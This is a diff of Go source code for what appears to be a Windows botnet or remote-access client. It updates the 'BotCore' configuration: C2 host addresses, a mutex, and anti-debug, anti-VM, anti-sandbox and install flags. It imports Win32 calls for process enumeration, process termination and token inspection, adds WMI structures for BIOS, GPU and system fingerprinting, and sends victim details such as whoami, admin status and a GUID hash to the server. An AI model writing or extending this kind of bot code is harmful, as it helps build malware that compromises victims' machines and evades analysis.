@@ -59,32 +59,33 @@ var (
 	advapi32 = syscall.NewLazyDLL("advapi32.dll")
 
 	// win32 api
-	pfnCreateMutexW        = kernel32.NewProc("CreateMutexW")
-	pfnIsDebuggerPresent   = kernel32.NewProc("IsDebuggerPresent")
-	pfnTerminateProcess    = kernel32.NewProc("TerminateProcess")
-	pfnEnumProcesses       = psapi.NewProc("EnumProcesses")
-	pfnEnumProcessModules  = psapi.NewProc("EnumProcessModules")
-	pfnGetModuleBaseNameW  = psapi.NewProc("GetModuleBaseNameW")
-	pfnOpenProcess         = kernel32.NewProc("OpenProcess")
-	pfnCloseHandle         = kernel32.NewProc("CloseHandle")
-	pfnGetLastError        = kernel32.NewProc("GetLastError")
-	pfnGetTokenInformation = advapi32.NewProc("GetTokenInformation")
-	pfnOpenProcessToken    = advapi32.NewProc("OpenProcessToken")
-	pfnGetCurrentProcess   = kernel32.NewProc("GetCurrentProcess")
+	pfnCreateMutexW         = kernel32.NewProc("CreateMutexW")
+	pfnIsDebuggerPresent    = kernel32.NewProc("IsDebuggerPresent")
+	pfnTerminateProcess     = kernel32.NewProc("TerminateProcess")
+	pfnEnumProcesses        = psapi.NewProc("EnumProcesses")
+	pfnEnumProcessModules   = psapi.NewProc("EnumProcessModules")
+	pfnGetModuleBaseNameW   = psapi.NewProc("GetModuleBaseNameW")
+	pfnOpenProcess          = kernel32.NewProc("OpenProcess")
+	pfnCloseHandle          = kernel32.NewProc("CloseHandle")
+	pfnGetLastError         = kernel32.NewProc("GetLastError")
+	pfnGetTokenInformation  = advapi32.NewProc("GetTokenInformation")
+	pfnOpenProcessToken     = advapi32.NewProc("OpenProcessToken")
+	pfnGetCurrentProcess    = kernel32.NewProc("GetCurrentProcess")
+	pfnGetVolumeInformation = kernel32.NewProc("GetVolumeInformationW")
 
 	botcore = BotCore{
-		version:      "1.5.4",
-		hosts:        []string{"127.0.0.1:3596"},
-		singleton:    true,
-		anti_debug:   false,
-		anti_vm:      false,
-		anti_sandbox: false,
-		install:      false,
-		use_ssl:      false,
-		delay:        0,
-		mutex_name:   "eSq3w0KtD7gDMR7q",
-		install_file: "",
-		install_path: "",
+		version:       "1.5.6",
+		hosts:         []string{"127.0.0.1:8080"},
+		singleton:     true,
+		sington_mutex: 0,
+		anti_debug:    false,
+		anti_vm:       false,
+		anti_sandbox:  false,
+		install:       false,
+		use_ssl:       false,
+		delay:         0,
+		mutex_name:    "eSq3w0KtD7gDMR7q",
+		install_file:  "",
 	}
 )
 
@@ -106,22 +107,38 @@ const (
 )
 
 type BotCore struct {
-	version      string
-	hosts        []string
-	singleton    bool
-	anti_debug   bool
-	anti_vm      bool
-	anti_sandbox bool
-	install      bool
-	use_ssl      bool
-	delay        uint
-	mutex_name   string
-	install_file string
-	install_path string
+	version       string
+	hosts         []string
+	singleton     bool
+	sington_mutex uintptr
+	anti_debug    bool
+	anti_vm       bool
+	anti_sandbox  bool
+	install       bool
+	use_ssl       bool
+	delay         uint
+	mutex_name    string
+	install_file  string
 }
 
 type Win32_Process struct {
 	Name string
+}
+
+type Win32_BIOS struct {
+	SerialNumber string
+}
+
+type Win32_VideoController struct {
+	Name          string
+	PNPDeviceID   string
+	AdapterRAM    uint64
+	DriverVersion string
+}
+
+type Win32_ComputerSystem struct {
+	Manufacturer string
+	Model        string
 }
 
 type ServerReply struct {
@@ -148,6 +165,7 @@ type Client struct {
 	Token       string `json:"token"`
 	Ip          string `json:"ip"`
 	Whoami      string `json:"whoami"`
+	GuidHash    string `json:"guid_hash"`
 	Os          string `json:"os"`
 	Installdate string `json:"installdate"`
 	Isadmin     string `json:"isadmin"`
